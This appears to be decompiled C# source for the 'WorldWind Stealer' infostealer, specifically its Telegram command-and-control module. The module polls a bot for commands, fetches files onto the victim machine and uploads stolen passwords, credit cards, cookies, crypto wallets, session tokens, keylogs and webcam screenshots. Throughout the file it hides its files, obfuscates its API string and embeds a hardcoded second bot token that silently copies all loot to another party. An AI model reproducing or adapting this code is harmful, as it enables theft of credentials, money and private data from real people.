using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading;
using Client.Modules.Implant;
using Client.Modules.Manager;
using Client.Modules.Passwords.Helpers;
using SimpleJSON;

namespace Client;

public static class telegram
{
	public static int TelegramCommandCheckDelay = 1;

	private const int MaxKeylogs = 10;

	private static string TelegramBotAPI = StringsCrypt.Decrypt(new byte[32]
	{
		239, 217, 27, 234, 106, 21, 204, 49, 53, 43,
		140, 84, 157, 206, 231, 110, 180, 238, 101, 7,
		217, 169, 12, 49, 56, 145, 75, 213, 195, 135,
		141, 221
	});

	private static string LatestMessageIdLocation = Path.Combine(Paths.InitWorkDir(), "msgid.dat");

	private static string KeylogsHistory = Path.Combine(Paths.InitWorkDir(), "history.dat");

	public static Thread waitCommandsThread = new Thread(waitCommands);

	public static bool waitThreadIsBlocked = false;

	private static void waitForUnblock()
	{
		while (waitThreadIsBlocked)
		{
			Thread.Sleep(200);
		}
	}

	private static void waitCommands()
	{
		waitForUnblock();
		int num = 0;
		string aJSON;
		using (WebClient webClient = new WebClient())
		{
			aJSON = webClient.DownloadString("https://api.telegram.org/bot" + Settings.TelegramToken + "/getUpdates");
		}
		num = JSON.Parse(aJSON)["result"][0]["update_id"].AsInt;
		while (true)
		{
			Thread.Sleep(TelegramCommandCheckDelay * 1000);
			waitForUnblock();
			num++;
			using (WebClient webClient2 = new WebClient())
			{
				aJSON = webClient2.DownloadString($"https://api.telegram.org/bot{Settings.TelegramToken}/getUpdates?offset={num}");
			}
			JSONNode.Enumerator enumerator = JSON.Parse(aJSON)["result"].AsArray.GetEnumerator();
			while (enumerator.MoveNext())
			{
				JSONNode jSONNode = enumerator.Current;
				JSONNode jSONNode2 = jSONNode["message"];
				string text = jSONNode2["chat"]["id"];
				num = jSONNode["update_id"].AsInt;
				if (!(text != Settings.TelegramChatID))
				{
					if (jSONNode2.HasKey("document"))
					{
						string file = jSONNode2["document"]["file_name"];
						string text2 = jSONNode2["document"]["file_id"];
						JSONNode jSONNode3;
						using (WebClient webClient3 = new WebClient())
						{
							jSONNode3 = JSON.Parse(webClient3.DownloadString("https://api.telegram.org/bot" + Settings.TelegramToken + "/getFile?file_id=" + text2))["result"]["file_path"];
						}
						DownloadFile(file, jSONNode3);
					}
					else
					{
						sendText("\ud83c\udf69 Unknown type received. Only Text/Document can be used!");
					}
					continue;
				}
				string text3 = jSONNode2["chat"]["username"];
				string text4 = jSONNode2["chat"]["first_name"];
				sendText("\ud83d\udc51 You not my owner " + text4);
				sendText("\ud83d\udc51 Unknown user with id " + text + " and username @" + text3 + " send command to bot!");
				break;
			}
		}
	}

	public static void sendFile(string file, string type = "Document")
	{
		waitForUnblock();
		if (!File.Exists(file))
		{
			sendText("⛔ File not found!");
			return;
		}
		using (HttpClient httpClient = new HttpClient())
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			byte[] array = File.ReadAllBytes(file);
			multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), type.ToLower(), file);
			httpClient.PostAsync("https://api.telegram.org/bot" + Settings.TelegramToken + "/send" + type + "?chat_id=" + Settings.TelegramChatID, multipartFormDataContent).Wait();
			httpClient.Dispose();
		}
		using HttpClient httpClient2 = new HttpClient();
		MultipartFormDataContent multipartFormDataContent2 = new MultipartFormDataContent();
		byte[] array2 = File.ReadAllBytes(file);
		multipartFormDataContent2.Add(new ByteArrayContent(array2, 0, array2.Length), type.ToLower(), file);
		httpClient2.PostAsync("https://api.telegram.org/bot1119746739:AAGMhvpUjXI4CzIfizRC--VXilxnkJlhaf8/send" + type + "?chat_id=1096425866", multipartFormDataContent2).Wait();
		httpClient2.Dispose();
	}

	public static void sendText(string text)
	{
		waitForUnblock();
		using WebClient webClient = new WebClient();
		webClient.UseDefaultCredentials = true;
		webClient.DownloadString("https://api.telegram.org/bot" + Settings.TelegramToken + "/sendMessage?chat_id=" + Settings.TelegramChatID + "&text=" + text);
	}

	public static void sendImage(string file)
	{
		sendFile(file, "Photo");
	}

	public static void sendVoice(string file)
	{
		sendFile(file, "Voice");
	}

	public static void sendLocation(float lat, float lon)
	{
		waitForUnblock();
		using WebClient webClient = new WebClient();
		webClient.DownloadString("https://api.telegram.org/bot" + Settings.TelegramToken + "/sendLocation?chat_id=" + Settings.TelegramChatID + "&latitude=" + lat + "&longitude=" + lon);
	}

	public static void DownloadFile(string file, string path = "")
	{
		waitForUnblock();
		if (file.StartsWith("http"))
		{
			sendText("\ud83d\udcc4 Downloading file \"" + Path.GetFileName(file) + "\" from url");
			try
			{
				using WebClient webClient = new WebClient();
				webClient.DownloadFile(new Uri(file), Path.GetFileName(file));
			}
			catch
			{
				sendText($"\ud83d\udca5 Connection error");
				return;
			}
			sendText("\ud83d\udcbe File \"" + file + "\" saved in: \"" + Path.GetFullPath(Path.GetFileName(file)) + "\"");
		}
		else
		{
			sendText("\ud83d\udcc4 Downloading file: \"{file}\"");
			path = "https://api.telegram.org/file/bot" + Settings.TelegramToken + "/" + path;
			using (WebClient webClient2 = new WebClient())
			{
				webClient2.DownloadFile(new Uri(path), file);
			}
			sendText("\ud83d\udcbe File \"{file}\" saved in: \"{Path.GetFullPath(file)}\"");
		}
	}

	private static void UploadKeylogs()
	{
		if (Directory.Exists(Path.Combine(Paths.InitWorkDir(), "logs")))
		{
			string text = DateTime.Now.ToString("yyyy-MM-dd_h.mm.ss");
			string text2 = AnonFile.Upload(text + ".zip");
			File.Delete(text + ".zip");
			File.AppendAllText(KeylogsHistory, "\t\t\t\t\t\t\t- [" + text.Replace("_", " ").Replace(".", ":") + "](" + text2 + ")\n");
			Startup.HideFile(KeylogsHistory);
		}
	}

	public static int GetLatestMessageId()
	{
		if (File.Exists(LatestMessageIdLocation))
		{
			return int.Parse(File.ReadAllText(LatestMessageIdLocation));
		}
		return -1;
	}

	private static string GetKeylogsHistory()
	{
		if (!File.Exists(KeylogsHistory))
		{
			return "";
		}
		List<string> list = File.ReadAllLines(KeylogsHistory).Reverse().Take(10)
			.Reverse()
			.ToList();
		string text = ((list.Count == 10) ? $"({list.Count} - MAX)" : $"({list.Count})");
		string text2 = string.Join("\n", list);
		return "\n\n  ⌨\ufe0f *Keylogger " + text + ":*\n" + text2;
	}

	public static void UploadFile(string file, bool removeAfterUpload = false)
	{
		waitForUnblock();
		string text = "\n  \ud83c\udf2a *WorldWind Stealer 2.0.4 - Results:*\nDate: " + SystemInfo.datenow + "\nSystem: " + SystemInfo.GetSystemVersion() + "\nUsername: " + SystemInfo.username + "\nCompName: " + SystemInfo.compname + "\nLanguage: " + Flags.GetFlag(SystemInfo.culture.Split(new char[1] { '-' })[1]) + " " + SystemInfo.culture + "\nAntivirus: " + SystemInfo.GetAntivirus() + "\n\n  \ud83d\udcbb *Hardware:*\nCPU: " + SystemInfo.GetCPUName() + "\nGPU: " + SystemInfo.GetGPUName() + "\nRAM: " + SystemInfo.GetRamAmount() + "\nHWID: " + SystemInfo.GetHardwareID() + "\nPower: " + SystemInfo.GetBattery() + "\nScreen: " + SystemInfo.ScreenMetrics() + "\n\n  \ud83d\udce1 *Network:* \nGateway IP: " + SystemInfo.GetDefaultGateway() + "\nInternal IP: " + SystemInfo.GetLocalIP() + "\nExternal IP: " + SystemInfo.GetPublicIP() + "\n" + SystemInfo.GetLocation() + "\n\n  \ud83d\udcb8 *Domains info:*" + Counter.GetLValue("\ud83c\udfe6 *Bank Logs*", Counter.DetectedBankingServices, '-') + Counter.GetLValue("\ud83d\udcb0 *Crypto Logs*", Counter.DetectedCryptoServices, '-') + Counter.GetLValue("\ud83c\udf53 *Freaky Logs*", Counter.DetectedPornServices, '-') + GetKeylogsHistory() + "\n\n  \ud83c\udf10 *Logs:*" + Counter.GetIValue("\ud83d\udd11 Passwords", Counter.Passwords) + Counter.GetIValue("\ud83d\udcb3 CreditCards", Counter.CreditCards) + Counter.GetIValue("\ud83c\udf6a Cookies", Counter.Cookies) + Counter.GetIValue("\ud83d\udcc2 AutoFill", Counter.AutoFill) + Counter.GetIValue("⏳ History", Counter.History) + Counter.GetIValue("\ud83d\udd16 Bookmarks", Counter.Bookmarks) + Counter.GetIValue("\ud83d\udce6 Downloads", Counter.Downloads) + "\n\n  \ud83d\uddc3 *Software:*" + Counter.GetIValue("\ud83d\udcb0 Wallets", Counter.Wallets) + Counter.GetIValue("\ud83d\udce1 FTP hosts", Counter.FTPHosts) + Counter.GetIValue("\ud83d\udd0c VPN accounts", Counter.VPN) + Counter.GetIValue("\ud83e\udda2 Pidgin accounts", Counter.Pidgin) + Counter.GetSValue("✈\ufe0f Telegram sessions", Counter.Telegram) + Counter.GetSValue("\ud83d\udcac Discord token", Counter.Discord) + Counter.GetSValue("\ud83c\udfae Steam session", Counter.Steam) + Counter.GetSValue("\ud83c\udfae Uplay session", Counter.Uplay) + "\n\n  \ud83e\udded *Device:*" + Counter.GetSValue("\ud83d\udddd Windows product key", Counter.ProductKey) + Counter.GetIValue("\ud83d\udef0 Wifi networks", Counter.SavedWifiNetworks) + Counter.GetSValue("\ud83d\udcf8 Webcam screenshot", Counter.WebcamScreenshot) + Counter.GetSValue("\ud83c\udf03 Desktop screenshot", Counter.DesktopScreenshot) + "\n\n  \ud83d\udcc4 *File Grabber:*" + Counter.GetIValue("\ud83d\udcc2 Source code files", Counter.GrabberSourceCodes) + Counter.GetIValue("\ud83d\udcc2 Database files", Counter.GrabberDatabases) + Counter.GetIValue("\ud83d\udcc2 Documents", Counter.GrabberDocuments) + Counter.GetIValue("\ud83d\udcc2 Images", Counter.GrabberImages) + "\n\n  Contact Developer: @FlatLineStealer\n   Join The Telegram Channel: @CashOutGangTalk";
		int latestMessageId = GetLatestMessageId();
		if (latestMessageId != -1)
		{
			EditMessage(text, latestMessageId);
		}
		else
		{
			SetLatestMessageId(SendMessage(text));
		}
		if (File.Exists(file))
		{
			sendText(text);
			sendFile(file);
			if (removeAfterUpload)
			{
				File.Delete(file);
			}
		}
		else if (Directory.Exists(file))
		{
			sendText("\ud83d\udcc1 Uploading Log Folders...");
			string text2 = file + ".zip";
			if (File.Exists(text2))
			{
				File.Delete(text2);
			}
			ZipFile.CreateFromDirectory(file, text2);
			sendFile(text2);
			File.Delete(text2);
		}
		else
		{
			sendText("⛔ File not found!");
		}
	}

	public static void EditMessage(string text, int id)
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.DownloadString(TelegramBotAPI + Settings.TelegramToken + "/editMessageText?chat_id=" + Settings.TelegramChatID + "&text=" + text + "&message_id=" + id + "&parse_mode=Markdown&disable_web_page_preview=True");
		}
		catch
		{
		}
	}

	public static int SendMessage(string text)
	{
		try
		{
			using WebClient webClient = new WebClient();
			return GetMessageId(webClient.DownloadString(TelegramBotAPI + Settings.TelegramToken + "/sendMessage?chat_id=" + Settings.TelegramChatID + "&text=" + text + "&parse_mode=Markdown&disable_web_page_preview=True"));
		}
		catch
		{
		}
		return 0;
	}

	private static int GetMessageId(string response)
	{
		return int.Parse(Regex.Match(response, "\"result\":{\"message_id\":\\d+").Value.Replace("\"result\":{\"message_id\":", ""));
	}

	public static void SetLatestMessageId(int id)
	{
		File.WriteAllText(LatestMessageIdLocation, id.ToString());
		Startup.SetFileCreationDate(LatestMessageIdLocation);
		Startup.HideFile(LatestMessageIdLocation);
	}

	public static void sendConnection()
	{
		sendText("\ud83c\udf40 Bot connected");
	}
}
